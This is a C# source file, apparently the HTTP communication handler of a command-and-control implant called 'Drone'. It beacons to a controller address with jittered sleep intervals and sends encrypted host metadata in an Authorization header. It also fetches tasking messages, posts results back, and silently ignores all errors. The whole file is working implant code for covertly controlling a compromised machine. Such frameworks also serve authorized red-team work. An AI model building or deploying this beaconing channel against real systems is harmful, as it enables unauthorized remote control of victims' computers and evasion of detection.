using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Handlers;

public sealed class HttpHandler : Handler
{
    private HttpClient _client;
    private CancellationTokenSource _tokenSource;

    public override event Func<IEnumerable<C2Message>, Task> OnMessagesReceived;

    public override async Task Start()
    {
        _client = new HttpClient();
        _client.BaseAddress = new Uri($"{ConnectAddress}:{ConnectPort}");
        _client.DefaultRequestHeaders.Clear();

        var metadata = Crypto.EncryptObject(Metadata).ToByteArray();
        _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {Convert.ToBase64String(metadata)}");

        _tokenSource = new CancellationTokenSource();

        while (!_tokenSource.IsCancellationRequested)
        {
            try
            {
                var response = await _client.GetAsync("/");
                await HandleResponse(response);
            }
            catch
            {
                // ignore
            }

            var span = new TimeSpan(0, 0, CalculateSleepTime());
            await Task.Delay(span, _tokenSource.Token);
        }
        
        _client.Dispose();
    }
    
    private int CalculateSleepTime()
    {
        var interval = Config.Get<int>(Setting.SleepInterval);
        var jitter = Config.Get<int>(Setting.SleepJitter);
        var diff = (int)Math.Round((double)interval / 100 * jitter);

        var min = interval - diff;
        var max = interval + diff;

        var rand = new Random();
        return rand.Next(min, max);
    }

    public override async Task SendMessages(IEnumerable<C2Message> messages)
    {
        var content = new ByteArrayContent(messages.Serialize());

        try
        {
            var response = await _client.PostAsync("/", content);
            await HandleResponse(response);
        }
        catch
        {
            // ignore
        }
    }

    private async Task HandleResponse(HttpResponseMessage response)
    {
        if (!response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.NoContent)
            return;

        var content = await response.Content.ReadAsByteArrayAsync();
        var messages = content.Deserialize<C2Message[]>();

        if (!messages.Any())
            return;

        OnMessagesReceived?.Invoke(messages);
    }

    public override void Stop()
    {
        _tokenSource.Cancel();
        _tokenSource.Dispose();
    }

    private static string ConnectAddress => "http://localhost";
    private static string ConnectPort => "8080";
}